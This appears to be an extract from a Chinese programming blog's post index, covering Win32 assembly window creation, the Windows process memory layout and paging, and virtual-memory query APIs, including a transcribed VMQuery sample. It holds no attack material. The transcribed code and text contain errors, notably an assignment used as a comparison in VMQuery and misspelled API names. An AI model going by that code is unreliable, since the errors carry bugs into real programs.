endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;_WinMain proc local @stWndClass:WNDCLASSEX local @stMsg:MSG invoke GetModuleHandle,NULL mov hInstance,eax invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass;********************************************************************; 注册窗口类;******************************************************************** invoke LoadCursor,0,IDC_ARROW mov @stWndClass.hCursor,eax push hInstance pop @stWndClass.hInstance mov @stWndClass.cbSize,sizeof WNDCLASSEX mov @stWndClass.style,CS_HREDRAW or CS_VREDRAW mov @stWndClass.lpfnWndProc,offset _ProcWinMain mov @stWndClass.hbrBackground,COLOR_WINDOW + 1 mov @stWndClass.lpszClassName,offset szClassName invoke RegisterClassEx,addr @stWndClass;********************************************************************; 建立并显示窗口;******************************************************************** invoke CreateWindowEx,WS_EX_CLIENTEDGE,offset szClassName,offset szCaptionMain,\\ WS_OVERLAPPEDWINDOW,\\ 100,100,600,400,\\ NULL,NULL,hInstance,NULL mov hWinMain,eax invoke ShowWindow,hWinMain,SW_SHOWNORMAL invoke UpdateWindow,hWinMain;********************************************************************; 消息循环;******************************************************************** .while TRUE invoke GetMessage,addr @stMsg,NULL,0,0 .break .if eax == 0 invoke TranslateMessage,addr @stMsg invoke DispatchMessage,addr @stMsg .endw ret_WinMain endp;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;start: call _WinMain invoke ExitProcess,NULL;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; end start 程序运行过程在屏幕上显示一个窗口的过程如下： 得到应用程序的句柄(GetModlueHandle) 注册窗口累(RegisterClassEx)。在此之前，先要填写RegisterClassEx的参数WNDCLASS结构 建立窗口(CreateWindowEx) 显示窗口(ShowWindow) 刷新窗口客户去(UpdateWindow) 无限的消息获取和处理的循环。首先获取消息(GetMessage)，如果由消息到达，则将消息分派到回调函数(DispatchMessage)，如果是WM_QUIT，则退出循环。 Windows对消息的处理。Windows在系统内部有一个系统消息队列，当输入设备有所动作的时候，比如用户按下键盘的某个键值，Windows都会产生相对应的记录放在系统消息队列中，每个记录中包含消息的类型、发生的位置和发生的时间信息等 同时，Windows为每个程序维护一个消息队列，Windows检查系统消息队列里消息的发生位置，当位置位于某个应用程序的窗口范围内的时候，就把这个消息派送到应用程序的消息队列中 当程序还没用来取消息的时候，消息就暂时存储在消息队列中，当程序中的消息循环执行到GetMessage的时候，控制权转移倒了GetMessage所在的User32.dll中，User32.dll从消息队列中取出一条消息，然后把这条消息返回应用程序 当应用程序处理这条消息的时候，方法不是自己直接调用窗口来完成，而是通过DispatchMessage间接调用窗口过程，是因为一个程序可能不止一个窗口，不同的窗口消息必须分派给相对应的窗口程序。 应用程序之间也可以互相发送消息，PostMessage是把一个消息放到其他程序的消息队列中。 分析窗口程序模块和句柄模块一个模块代表的是一个运行中的exe文件或dll文件，用来代表这个文件中所有的代码和资源，磁盘上的文件不是模块，装入内存运行时就称为模块。每个模块都有一个唯一的模块句柄来标识 模块句柄的数值等于程序在内存中装入的起始地址 在Win32中，程序运行时是隔离的，每个实例都有自己私有的4GB内存空间，都认为自己是唯一的，不存在一个模块的多个实例问题，在Win32中，实例句柄就是模块句柄。 句柄句柄只是Windows用来表示各种资源的标号，可见只有Windows才知道怎么使用它来引用各种资源。 窗口通信窗口通信一般使用SendMessage或者PostMessage函数，这两个函数的用法是相同的。","link":"/2020/04/07/Windows-Assembly-4/"},{"title":"Windows-Kernel-13","text":"Windows的内存结构 进程的虚拟地址空间每个进程都被赋予它自己的虚拟地址空间。对32位进程来说，这个地址是4GB，对64位来说，这个地址空间是16EB。 由于每个进程都可以接收它自己的私有的地址空概念，因此当进程中的一个线程正在运行时，该线程可以访问只属于它的进程的内存。属于其它进程的内存则隐藏着，并且不能被正在运行的线程访问 虚拟地址空不同于物理空间，该地址空间只是内存地址的一个范围，在你能够访问数据而不会出现违规访问之前，必须赋予物理存储器，或者将物理存储器映射到各个部分的地址空间。 虚拟地址空间如何区分每个进程的虚拟地址空间都要划分成各个分区，地址空间的分区是根据操作系统的基本实现方法来进行的。 NULL指针分配的分区进程地址空间的这个分区的设置是为了帮助程序员掌握NULL指针的分配情况，如果你的进程空间中的线程试图读取该分区的地址空间的数据，那么就会引起CPU的异常访问 C/C++中通常不会进行严格的错误检查 12int *p = (int *)malloc(sizeof(int));*p = 5; 如果malloc不能找到足够的内存来分配，它就会返回null。代码并不会检查这个可能性，它认为地址的分配已经成功，并且开始访问0x00000000地址的内存。由于这个分区的地址是禁止进入的，因此就会发生内存违规访问，同时终止进程。 MS-DOS/16位Windows应用程序兼容分区进程地址空间的4MB分区是Windows98需要的，目的是维护MS-DOS应用程序与16位应用程序的兼容性。 在理想的情况下，如果进程中的线程访问该内存块，CPU会报异常，但是由于技术上的原因，微软并没有保护这个4MB的地址空间 用户方式分区这个分区是进程的私有（非共享）地址空间所在的地方。一个进程不能读取、写入、或者以任何方式访问驻留在该分区中的另一个进程的数据。对于所有应用程序来说，该分区是维护进程的大部分数据的地方。由于每个进程可以得到它自己的私有的、非共享分区，以便存放它的数据，因此，应用程序不太可能被其他应用程序所破坏，这使得整个系统更加健壮。 Win2000:所有的.exe和DLL模块均加载这个分区，每个进程可以将这个DLL加载到该分区不同的地址中（可能小）。系统还可以在这个分区中映射该进程可以访问的所有内存映射文件 Win98：在Win98中，主要的Win32系统DLL(Kernel.dll，AdvApi32.dll，user32.dll和GDI32.dll)均加载共享内存映射文件分区中。 Win98： 当操作系统创建进程的地址空间时，需要检查一个可执行的 L A R G E A D D R ES S AWA R E标志。对于D L L，系统则忽略该标志。在编写 D L L时，必须使之能够在 3G B用户方式分区中正确地运行，否则它们的行为特性是无法确定的。 Win2000（x64） 默认情况下，当启动一个6 4位应用程序时，系统将保留从 0 x 0 0 0 0 0 0 0 8 0 0 0 0 0 0 0 0开始的所有用户地址空间。这可以确保在底部的 2GB 64位地址空间中进行所有的内存分配。这就是地址空间的范围。 当操作系统创建进程的 6 4位地址空间时，要检查一个可执行文件的L A R G E A D D R E S S AWA R E标志。如果是D L L，那么系统将忽略该标志。编写D L L时，必须使之能够在整个4 TB用户方式分区中正确地运行，否则它们的行为特性将无法确定。 64KB禁止进入的分区这个方式仅适用于Windows 2000操作系统。 Windows2000上这个位于用户分区上面的64KB分区是禁止进入的，访问该分区中的内存的任意企图均导致访问违规。 123BYTE bBuf[70000];DWORD dwNumBytesWritten;WriteProcrssMemory(GetCurrentProcess(),(PVOID) 0x7FFEEE90,bBuf,sizeof(bBuf),&amp;dwNumBytesWritten); 对于WriteProcrssMemory来说，写入内存区是由内核方式来生效的，改代码能够访问内核方式分区中的内存(32位系统上0x80000000以上的地址)。 微软选择的办法是使这个分区始终保持禁止进入状态。只要试图进入，就一定会产生访问违规。 共享的MMF分区这个1GB分区所系统用来存放所有32位进程共享数据的地方，32位进程都可以很容易放到他们。系统还为每个进程将DLL加载相同的内存地址。 内核方式分区这个分区是存放操作系统代码的地方。用于线程调度、内存管理、文件系统支持、网络支持和所有设备驱动程序的代码都在这个分区加载。驻留在这个分区中的一切均可被所有进程共享。 地址空间中的区域当进程被创建并且赋予它的地址空间时，该可用地址空间的主体是空间（未分配）。 每当你保留地址空间的一个区域时，系统要确定该区域从一个分配粒度的边界开始，对于不同的cpu来说，分配粒度是不同的。但是大部分使用64KB这个相同的分配粒度。 当你保留地址空间的一个区域时，系统还要确定该区域的大小是系统的页面大小的倍数。页面是系统在管理系统时使用的一个内存单位。x86使用的页面大小是4kb 有时系统能够代表你的进程来保留地址空间的区域。例如，系统可以分配一个地址空间区域，以便存放进程环境块（F E B）。F E B是由系统创建、操作和撤消的一个小型数据结构。当创建一个进程时，系统就为F E B分配一个地址空间区域。 系统也需要创建一个线程环境块（ T E B），以便管理进程中当前存在的所有线程。用于这些T E B的区域将根据进程中的线程被创建和撤消等情况而保留和释放。 虽然系统规定，要求保留的地址空间区域均从分配粒度边界（目前所有平台上均为6 4 K B）开始，但是系统本身并不受这个规定的限制。为你的进程的 P E B和T E B保留的地址空间区域很可能不是从 64 KB这个边界开始的。不过这些保留区域仍然必须是C P U的页面大小的倍数。 提交地址空间区域中的物理存储器如需要使用已保留的地址空间区域，必须分配物理存储器，然后将该物理存储器映射到已保留的区域空间，这个操作称为提交物理存储器。 物理存储器总是以页面的形式来提交的。若要将物理存储器提交给一个保留的地址空间，也要调用VirtualAlloc函数 当我们调拨物理存储器给区域的时候，并不需要给整个区域都调拨物理存储器。例如可以预定一块大小为64KB的区域，然后把物理存储区调拨给该区域中的第二个页面和第四个页面。如下图： 撤销调拨（decommitting）当程序不再需要访问所预定区域中已调拨的物理存储器时，应该释放物理存储器。通过调用VirtualFree函数来完成 物理存储器与页文件磁盘上有一种称为页交换文件(paging file) 其中包含虚拟内存，可供任何进程使用。 当线程试图访问存储器的一个字节时，cpu必须知道该字节是在内存还是在磁盘上。 从应用程序的角度讲，页交换文件以一种透明的方式增大了应用程序可用内存的总量。 最好把物理存储器看成是保存在磁盘（通常是硬盘）上的页交换文件中的数据，当应用程序调用VirtualAlloc函数来把物理存储器调拨给地址空间区域时， 该空间实际上是从硬盘上的页交换文件分配得到的。 当一个线程试图访问所属进程的地址空间中的一块数据（17章介绍的内存映射文件之外）时，可能会有两种情况。 线程要访问的数据就在内存中。cpu会把数据的虚拟内存地址映射到内存（RAM）的物理地址，接下来就可以访问内存中的数据。 线程要访问的数据不在内存，而是位于页交换文件（pagefile）中的某处。这次不成功的访问会成为页错误。 当发生页错误时，cpu会通知操作系统。操作系统会在随机内存（RAM）中找一个闲置的页面，如果找不到就必须先释放一个已分配的页面。如果被释放的页面没有修改过，那么操作系统可以直接释放该页面。如果系统需要释放一个已修改过的页面，那么必须先把页面从内存赋值到页交换文件。 接下来操作系统会在页交换文件中对所需访问的数据块进行重定位，并把数据载入到内存中闲置的页面。 然后操作系统对其内部的表项进行更新，以反映该数据的需内存地址现在已经被映射到了内存中对应的物理内存地址。 接着cpu会再次运行那条引发页面错误的指令，（和前一次不同）这次cpu能够将虚拟内存地址映射到物理内存地址（RAM）并成功访问所需要的数据。 系统在内存和页文件之间交换越频繁，硬盘颠簸（thrash）的越厉害（指cpu把时间都花在页面文件和内存之间的交换数据上，导致没有时间运行程序） 理论上一进程的内存调拨过程：系统为进程的代码和数据预定地址空间区域，为这些区域调拨物理内存，然后把程序文件中的代码和数据复制到已调拨的物理存储器中（page file） 可是实际上上面这个过程并不是总是执行。（因为这会带来极差的性能） 实际情况是：系统会计算应用程序的代码和数据大小。然后系统预定一块地址空间，并注明与该区域相关联的物理存储器就是这个exe本身。是的，系统并没有从页交换文件中分配空间，而是将exe文件的实际内容（或文件映像，即file image）用作程序预定的地址空间区域。这样不但载入程序非常快，而且页面交换文件也可以保持一个合理的大小。 当把一个位于硬盘上的文件映像（即dll或exe）用作地址空间区域对应的物理存储器（通常是hdd）我们称为这个文件映像为内存映像文件（memory mapped file）。 当载入一个exe或dll，系统会自动预定地址空间区域并把文件映像映射到该区域。 windows可以使用多个页交换文件。（如果多个页交换文件位于不同的物理硬盘上）系统可以运行更快，因为系统能同时写入多个磁盘。 设定页交换文件： 当. e x e或D L L文件从软盘加载时，Windows 98和Windows 2000都能将整个文件从软盘拷贝到系统的 R A M中。此外，系统将从页文件中分配足够的内存，以便存放该文件的映像。如果系统选择对当前包含该文件的一部分映像的 R A M页面进行裁剪，那么该内存属于只能写入的内存。如果系统 R A M上的负载比较小，那么文件始终都可以直接从R A M来运行。 保护属性x86处理器和Alpha CPU不执行“执行”保护模式，不过操作系统软件却支持这个属性，这些CPU将度访问视为执行访问。 页面保护属性： Copy-On-Write访问操作系统给内存区域赋予了Copy-On-Write保护属性，当一个.exe或者DLL模块被映射到一个内存地址的时候，系统将计算有多少页是可以写入的（通常包含代码的页面标为PAGE_EXECUTE_READ，而包含数据的页面则被标为PAGE_READWRITE）。 当一个进程中的线程试图将数据写入一个共享内存块的时候，系统会主动进行干预，并执行以下步骤： 系统查找RAM中的一个空闲内存页面。 系统将试图被修改的页面内容拷贝到找到的页面，原始页面的保护属性和数据不发生变化 然后系统更新进程的页面表，使得被访问的虚拟地址被转换成新的RAM页面。 此外，当使用 Vi r t u a l A l l o c函数来保留地址空间或者提交物理存储器时，不应该传递PA G E _ W R I T E C O P Y或PA G E _ E X E C U T E _ W R I T E C O P Y。如果传递的话，将会导致Vi r t u a l A l l o c调用的失败。对G e t L a s t E r r o r的调用将返回E R R O R _ I N VA L I D _ PA R A M E T E R。当操作系统映射. e x e或D L L文件映像时，这两个属性将被操作系统使用。 特殊的访问保护属性的标志PA G E _ N O C A C H E：用于停用已提交页面的高速缓存。 PA G E _ W R I T E C O M B I N E：它允许把单个设备的多次写入合并在一起，以便提高运行性能。 PA G E _ G U A R D：可以在页面上写入一个字节时使应用程序收到一个通知（通过一个异常条件）。 综合使用所有的元素地址是从0x00000000的区域开始观察进程的地址空间的，并在可用地址空闲的最后一个区域结束，该区域的起始地址是0x7FFE0000. 非空闲区域的所有基地址几乎都是从6 4 K B的倍数上开始的。 区域类型共有 4个值，即空闲，私有，映像或映射。 区域的内部情况 数据对其的重要性当C P U访问正确对齐的数据时，它的运行效率最高。当数据大小的数据模数的内存地址是0时，数据是对齐的。","link":"/2019/09/04/Windows-Kernel-13/"},{"title":"Windows-Kernel-14","text":"虚拟内存 系统信息许多操作系统的值是根据主机而定的，可以使用GetSysteminfo函数用于检索与主机相关的值： 1VOID GetSystemInfo(LPSYSTEM_INFO psinf); 必须传递SYSMTE_INFO结构的地址给这个函数。这个函数将初始化所有的结构成员然后返回。 SYSTEM_INFO数据结构的原型： 123456789101112131415161718typedef struct _SYSTEM_INFO { union { DWORD dwOemId; // Obsolete field...do not use struct { WORD wProcessorArchitecture; WORD wReserved; } DUMMYSTRUCTNAME; } DUMMYUNIONNAME; DWORD dwPageSize; LPVOID lpMinimumApplicationAddress; LPVOID lpMaximumApplicationAddress; DWORD_PTR dwActiveProcessorMask; DWORD dwNumberOfProcessors; DWORD dwProcessorType; DWORD dwAllocationGranularity; WORD wProcessorLevel; WORD wProcessorRevision;} SYSTEM_INFO, *LPSYSTEM_INFO; 与内存无关成员函数： SysInfo应用程序： 如果想要得到机器中与处理器有关的详细信息，可以调用GetLogicalProcessorInformation函数。如下面代码所示： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647#include &lt;tchar.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;windows.h&gt;void ShowProcessors() { PSYSTEM_LOGICAL_PROCESSOR_INFORMATION pBuffer = NULL; DWORD dwSize = 0; DWORD procCoreCount; BOOL bResult = GetLogicalProcessorInformation(pBuffer, &amp;dwSize); if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) { _tprintf(TEXT(&quot;Impossible to get processor information\\n&quot;)); return; } pBuffer = (PSYSTEM_LOGICAL_PROCESSOR_INFORMATION)malloc(dwSize); bResult = GetLogicalProcessorInformation(pBuffer, &amp;dwSize); if (!bResult) { free(pBuffer); _tprintf(TEXT(&quot;Impossible to get processor information\\n&quot;)); return; } procCoreCount = 0; DWORD lpiCount = dwSize / sizeof(SYSTEM_LOGICAL_PROCESSOR_INFORMATION); for (DWORD current = 0; current &lt; lpiCount; current++) { if (pBuffer[current].Relationship == RelationProcessorCore) { if (pBuffer[current].ProcessorCore.Flags == 1) { _tprintf(TEXT(&quot; + one CPU core (HyperThreading)\\n&quot;)); } else { _tprintf(TEXT(&quot; + one CPU socket\\n&quot;)); } procCoreCount++; } } _tprintf(TEXT(&quot; -&gt; %d active CPU(s)\\n&quot;), procCoreCount); free(pBuffer);}int main(){ ShowProcessors(); system(&quot;pause&quot;);} 虚拟内存状态Windows函数GlobalMemoryStatus可用于检索相当于当前内存状态的动态信息： 1VOID GlobalMemoryStatus(LPMEMORYSTATUS pmts); 当调用GlobalMemoryStatus时，必须传递一个MEMORYSTATUS结构的地址。 MEMORYSTATUS数据结构： 12345678910typedef struct _MEMORYSTATUS { DWORD dwLength; DWORD dwMemoryLoad; SIZE_T dwTotalPhys; SIZE_T dwAvailPhys; SIZE_T dwTotalPageFile; SIZE_T dwAvailPageFile; SIZE_T dwTotalVirtual; SIZE_T dwAvailVirtual;} MEMORYSTATUS, *LPMEMORYSTATUS; 调用之前必须初始化dwLength成员设置为MEMORYSTATUS结构的大小。（为了后续添加新的成员） GlobalMemoryStatus会对其他成员进行初始化，然后返回。 如果希望应用程序在内存大于4GB的计算机上运行，那么可以使用新的GlobalMemoryStatusEx函数： 1BOOL GlobalMemoryStatusEx(LPMEMORYSTATUSEX pmst); 必须给该函数传递新的GlobalMemoryStatusEx结构的地址： 1234567891011typedef struct _MEMORYSTATUSEX { DWORD dwLength; DWORD dwMemoryLoad; DWORDLONG ullTotalPhys; DWORDLONG ullAvailPhys; DWORDLONG ullTotalPageFile; DWORDLONG ullAvailPageFile; DWORDLONG ullTotalVirtual; DWORDLONG ullAvailVirtual; DWORDLONG ullAvailExtendedVirtual;} MEMORYSTATUSEX, *LPMEMORYSTATUSEX; 这个结构就是加你个成员的大小换成了64位，因此能容纳大于4GB的值 ullAvailExtendedVirtual 指在当前进程的虚拟地址空间中尚未被预定的那一大块内存地址空间的大小。只对特定配置中的特定cpu体系结构才有意义。 更多的监视操作系统和进程内存的API 确定地址空间的状态Windows提供了一个函数，可以用来查询地址空间中内存地址的信息VirtualQuery。 VirtualQuery： 12345DWORD VirtualQuery{ LPCVOID pvAddress, PMEMORY_BASIC_INFORMATION pmbi, DWORD dwLength}; 还有另一个函数允许一个进程来查询另外一个进程的内存信息VirtualQueryEx: 123456DWORD VirtualQueryEx{ HANDLE hProcess, LPCVOID pvAddress, PMEMORY_BASIC_INFORMATION pmbi, DWORD dwLength}; 传递一个进程的句柄，以此来查询哪个进程的地址空间。（通常用于调试器和一些工具软件） lpAddress 要查询的虚拟地址 pmbi必须由调用者创建的MEMORY_BASIC_INFORMATION结构 123456789typedef struct _MEMORY_BASIC_INFORMATION { PVOID BaseAddress; PVOID AllocationBase; DWORD AllocationProtect; SIZE_T RegionSize; DWORD State; DWORD Protect; DWORD Type;} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION; 最后一个参数dwLength用来指定MEMORY_BASIC_INFORMATION结构的大小。 VirtualQuery(Ex)的返回值是其复制到缓存中的字节数。 关于VirtualQuery在MEMORY_BASIC_INFORMATION结构中填入的信息参考如下： VMQuery函数由于系统提供的VirtualQuery具有一定的局限性，不能知道已预订区域的大小，或者某个区域中块的数量，或者某个区域是否包含线程栈，等等。 作者自己创建了VMQuery函数： 12345BOOL VMQuery{ HANDLE hProcess, PVOID pvAddress, PVMQUERY pVMW}; 该函数与Vi r t u a l Q u e r y E x有些类似，它拥有一个进程句柄（在 h P r o c e s s中），一个内存地址（在 p v A d d r e s s中）和一个指向将被填充的结构的指针（由 p V M Q设定）。 12345678910111213141516171819202122typedef struct { // Region information PVOID pvRgnBaseAddress; DWORD dwRgnProtection; // PAGE_* SIZE_T RngSize; DWORD dwRgnStorage; // MEM_*: Free, Image, Mapped, Private DWORD dwTgnBlocks; DWORD dwRgnGuardBlks; // If &gt; 0, region contains thread stack BOOL bRgnIsAStack; // TRUE if region contains thread stack // Block information PVOID pvBlkBaseAddress; DWORD dwBlkProtection; // PAGE_* SIZE_T BlkSize; DWORD dwBlkStorage; // MEM_*: Free, Image, Mapped, Private} VMQUERY, *PVMQUERY; BOOL VMQuery( HANDLE hProcess, LPCVOID pvAddress, PVMQUERY pVMQ); .cpp代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195/******************************************************************************Module: VMQuery.cppNotices: Copyright (c) 2008 Jeffrey Richter &amp; Christophe Nasarre******************************************************************************/ #include &quot;..\\CommonFiles\\CmnHdr.h&quot;#include &lt;windowsx.h&gt;#include &quot;VMQuery.h&quot; ////////////////////////////////////////////////////////////////////////// // Helper structuretypedef struct { SIZE_T RgnSize; DWORD dwRgnStorage; // MEM_*: Free, Image, Mapped, Private DWORD dwRgnBlocks; DWORD dwRgnGuardBlks; // If &gt; 0, region contains thread stack BOOL bRgnIsAStack; // TRUE if region contains thread stack} VMQUERY_HELP; // This global, static variable holds the allocation granularity value for// this CPU platform. Initialized the first time VMQuery is called.static DWORD gs_dwAllocGran = 0; ////////////////////////////////////////////////////////////////////////// // Iterates through a region's blocks and returns finding in VMQUERY_HELPstatic BOOL VMQueryHelp(HANDLE hProcess, LPCVOID pvAddress, VMQUERY_HELP *pVMQHelp) { ZeroMemory(pVMQHelp, sizeof(*pVMQHelp)); // Get address of region containing passed memory address. MEMORY_BASIC_INFORMATION mbi; BOOL bOk = (VirtualQueryEx(hProcess, pvAddress, &amp;mbi, sizeof(mbi)) == sizeof(mbi)); if (!bOk) return bOk; // Bad memory address, return failure // Walk starting at the region's base address (which never changes) PVOID pvRgnBaseAddress = mbi.AllocationBase; // Walk starting at the first block in the region (changes in the loop) PVOID pvAddressBlk = pvRgnBaseAddress; // Save the memory type of the physical storage block. pVMQHelp-&gt;dwRgnStorage = mbi.Type; for (;;) { // Get info about the current block. bOk = (VirtualQueryEx(hProcess, pvAddressBlk, &amp;mbi, sizeof(mbi)) == sizeof(mbi)); if (!bOk) break; // Couldn't get the information; end loop. // Is this block in the same region? if (mbi.AllocationBase != pvRgnBaseAddress) break; // Found a block in the next region; end loop. // We have a block contained in the region. pVMQHelp-&gt;dwRgnBlocks++; // Add another block to the region pVMQHelp-&gt;RgnSize += mbi.RegionSize; // Add block's size to region size // If block has PAGE_GUARD attribute, add 1 to this counter if ((mbi.Protect &amp; PAGE_GUARD) == PAGE_GUARD) pVMQHelp-&gt;dwRgnGuardBlks++; // Take a guess as to the type of physical storage committed to the // block. This is a guess because some blocks can convert from MEM_IMAGE // to MEM_PRIVATE or from MEM_MAPPED to MEM_PRIVATE; MEM_PRIVATE can // always be overridden by MEM_IMAGE or MEM_MAPPED. if (pVMQHelp-&gt;dwRgnStorage == MEM_PRIVATE) pVMQHelp-&gt;dwRgnStorage = mbi.Type; // Get the address of the next block. pvAddressBlk = (PVOID)((PBYTE)pvAddressBlk + mbi.RegionSize); } // After examing the region, check to see whether it is a thread stack // Windows Vista: Assume stack if region has at least 1 PAGE_GUARD block pVMQHelp-&gt;bRgnIsAStack = (pVMQHelp-&gt;dwRgnGuardBlks &gt; 0); return TRUE;} ////////////////////////////////////////////////////////////////////////// BOOL VMQuery(HANDLE hProcess, LPCVOID pvAddress, PVMQUERY pVMQ) { if (gs_dwAllocGran = 0) { // Set allocation granularity if this is the first call SYSTEM_INFO sinf; GetSystemInfo(&amp;sinf); gs_dwAllocGran = sinf.dwAllocationGranularity; } ZeroMemory(pVMQ, sizeof(*pVMQ)); // Get the MEMORY_BASIC_INFORMATION for the passed address. MEMORY_BASIC_INFORMATION mbi; BOOL bOk = (VirtualQueryEx(hProcess, pvAddress, &amp;mbi, sizeof(mbi)) == sizeof(mbi)); if (!bOk) return bOk; // Bad memory address; return failure // The MEMORY_BASIC_INFORMATION structure contains valid information. // Time to start setting the members of our own VMQUERY structure. // First, fill in the block members. We'll fill the region members later. switch (mbi.State) { case MEM_FREE: // Free block (not reserved) pVMQ-&gt;pvBlkBaseAddress = NULL; pVMQ-&gt;BlkSize = 0; pVMQ-&gt;dwBlkProtection = 0; pVMQ-&gt;dwBlkStorage = MEM_FREE; break; case MEM_RESERVE: // Reserved block without committed storage in it. pVMQ-&gt;pvBlkBaseAddress = mbi.BaseAddress; pVMQ-&gt;BlkSize = mbi.RegionSize; // For an uncommitted block, mbi.Protect is invalid. So we will // show that the reserved block inherits the protection attribute // of the region in which it is contained. pVMQ-&gt;dwBlkProtection = mbi.AllocationProtect; pVMQ-&gt;dwBlkStorage = MEM_RESERVE; break; case MEM_COMMIT: // Reserve block with committed storage in it. pVMQ-&gt;pvBlkBaseAddress = mbi.BaseAddress; pVMQ-&gt;BlkSize = mbi.RegionSize; pVMQ-&gt;dwBlkProtection = mbi.Protect; pVMQ-&gt;dwBlkStorage = mbi.Type; break; default: DebugBreak(); break; } // Now fill in the region data members. VMQUERY_HELP VMQHelp; switch (mbi.State) { case MEM_FREE: // Free block (not reserved) pVMQ-&gt;pvRgnBaseAddress = mbi.BaseAddress; pVMQ-&gt;dwRgnProtection = mbi.AllocationProtect; pVMQ-&gt;RgnSize = mbi.RegionSize; pVMQ-&gt;dwRgnStorage = MEM_FREE; pVMQ-&gt;dwRgnBlocks = 0; pVMQ-&gt;dwRgnGuardBlks = 0; pVMQ-&gt;bRgnIsAStack = FALSE; break; case MEM_RESERVE: // Reserved block without committed storage in it. pVMQ-&gt;pvRgnBaseAddress = mbi.AllocationBase; pVMQ-&gt;dwRgnProtection = mbi.AllocationProtect; // Iterate through all blocks to get complete region information. VMQueryHelp(hProcess, pvAddress, &amp;VMQHelp); pVMQ-&gt;RgnSize = VMQHelp.RgnSize; pVMQ-&gt;dwRgnStorage = VMQHelp.dwRgnStorage; pVMQ-&gt;dwRgnBlocks = VMQHelp.dwRgnBlocks; pVMQ-&gt;dwRgnGuardBlks = VMQHelp.dwRgnGuardBlks; pVMQ-&gt;bRgnIsAStack = VMQHelp.bRgnIsAStack; break; case MEM_COMMIT: // Reserved block with committed storage in it. pVMQ-&gt;pvRgnBaseAddress = mbi.AllocationBase; pVMQ-&gt;dwRgnProtection = mbi.AllocationProtect; // Iterate through all blocks to get complete region information. VMQueryHelp(hProcess, pvAddress, &amp;VMQHelp); pVMQ-&gt;RgnSize = VMQHelp.RgnSize; pVMQ-&gt;dwRgnStorage = VMQHelp.dwRgnStorage; pVMQ-&gt;dwRgnBlocks = VMQHelp.dwRgnBlocks; pVMQ-&gt;dwRgnGuardBlks = VMQHelp.dwRgnGuardBlks; pVMQ-&gt;bRgnIsAStack = VMQHelp.bRgnIsAStack; break; default: DebugBreak(); break; } return bOk;} //////////////////////////////// End of File ////////////////////////////////// 代码在Github下Windows核心编程-14 从vs2005开始，开发人员构建的DLL和EXE是可以通过/dynamicbase连接器开关，打开ALSR。","link":"/2019/09/04/Windows-Kernel-14/"},{"title":"Windows内存管理","text":"在多进程的环境中，为了支持每个进程有独立的地址空间，以及进程地址空间和系统地址空间之间的隔离保护，Windows在处理器寻址机制的基础上，又应用了大量的内存管理管理技术来满足各种需求。 内存管理概述","link":"/2019/09/06/Windows%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86/"},{"title":"Windows应用程序-API概要","text":"Windows程序设计的一些基本概念，包括在WIndows程序设计中所使用到的一些特有数据类型；还有将Windows众多的API进行了分类，初步介绍Windows API与动态链接的原理，以及Windows应用程序所使用的字符集等; Windows数据类型Windows API使用很多Windows自定义的数据类型，但是必须熟悉Windows的数据类型； 在众多的Windows数据类型中，最常用的有DWORD、HANDLE、LPSTSTR、WORD、BYTE、CHAR等。 在Windows系统中，DWORD用于表示无符号整形数据，32位，在一般情况下BYTE是8位，而WORD是16位，DWORD是32位 Windows系统中特殊的数据类型—-HANDLE，通常HANDLE类型的变量用于唯一标识一个“对象”，如窗口、控件、文件等 Windows数据类型示例常用数据类型演示1234567891011121314151617181920212223242526272829303132#include &lt;Windows.h&gt;#include &lt;stdio.h&gt;int WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPSTR lpCmdLine,int nCmdShow){ LPSTR szString = &quot;Windows data type ,string&quot;; char lpString[120]; DWORD dwMax = 0XFFFFFFFF; DWORD dwOne = 0X1; int iMax = 0XFFFFFFFF; int iOne = 011; MessageBoxA(NULL, szString, &quot;LPSTR&quot;, MB_OK); CopyMemory(lpString, szString, lstrlen(szString) + 1); //赋值内存，将字符串复制到数据中，+1是为了\\0 MessageBoxA(NULL, lpString, &quot;char[]&quot;, MB_OK); if (dwMax &gt; dwOne) { MessageBoxA(NULL, &quot;DWORD类型的数据0xFFFFFFFF &gt; 0x1&quot;, &quot;DWORD&quot;, MB_OK); } if (iMax &lt; iOne) { MessageBoxA(NULL, &quot;Int类型的数据 0xFFFFFFFF &lt; 0x1&quot;, &quot;INT&quot;, MB_OK); } return 0;} LPSTR类型的数据是字符串，也就是字符数组，相当于C语言中的char 